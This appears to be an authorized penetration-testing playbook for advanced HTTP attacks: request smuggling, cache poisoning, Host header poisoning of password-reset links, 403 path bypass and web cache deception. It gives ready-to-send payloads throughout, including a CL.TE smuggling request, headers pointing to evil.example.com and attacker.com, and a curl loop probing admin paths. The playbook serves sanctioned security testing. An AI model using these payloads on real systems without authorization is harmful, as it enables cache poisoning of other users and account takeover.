# HTTP Advanced (Smuggling, Cache Poisoning, Host Attacks)

**Prerequisite:** In-scope web target in [`../../AUTHORIZATION.md`](../../AUTHORIZATION.md). Smuggling/cache tests can affect other users — **confirm RoE** allows request smuggling / cache poisoning research.

## Decision tree

```text
Reverse proxy + backend (nginx/apache/CDN)?
├─ YES → CL.TE / TE.CL probe (single request, monitor 404/400 timing)
├─ Cache present (Age, X-Cache, CF-Cache)?
│   └─ unkeyed headers: X-Forwarded-Host, X-Original-URL → cache poison
├─ Host header in password reset links?
│   └─ Host/X-Forwarded-Host poisoning
└─ 403 bypass → alternate verbs, X-Original-URL, path /./admin
```

## Request smuggling (manual Burp — Turbo Intruder / HTTP Request Smuggler if installed)

```http
POST / HTTP/1.1
Host: app.example.com
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

Observe desync: duplicate responses, wrong routing.  
Tool: `python3 -m smuggler -u https://app.example.com` (if installed).

## Cache poisoning

1. Find unkeyed input reflected in cached response (header or param).
2. Send:

```http
GET /static/app.js HTTP/1.1
Host: app.example.com
X-Forwarded-Host: evil.example.com
```

3. Re-request without header — if poison persists, impact.

## Host header / password reset

```http
POST /forgot-password HTTP/1.1
Host: attacker.com
X-Forwarded-Host: attacker.com

{"email":"your-test-account@example.com"}
```

Check reset link domain in email (test account only).

## 403 / path bypass

```bash
for path in "/admin" "/./admin" "/admin/." "/admin%2f" "/Admin" "/api/../admin"; do
  curl -sk -o /dev/null -w "%{http_code} $path\n" "https://app.example.com$path"
done
curl -sk -X POST "https://app.example.com/admin" -H "X-Original-URL: /admin"
```

## Web cache deception

Try: `/account/nonsense.css` or `/home.css` — access control on path vs extension.

## Intel hooks

```bash
python3 ../../scripts/intel.py $ENG/intel.json add-tech "cloudflare-cache"
python3 ../../scripts/intel.py $ENG/intel.json mark-done http_advanced_pass
```

## Handoff

- Smuggled internal request hits admin → `idor-bola` / `injection`
- Confirmed → `reporting`
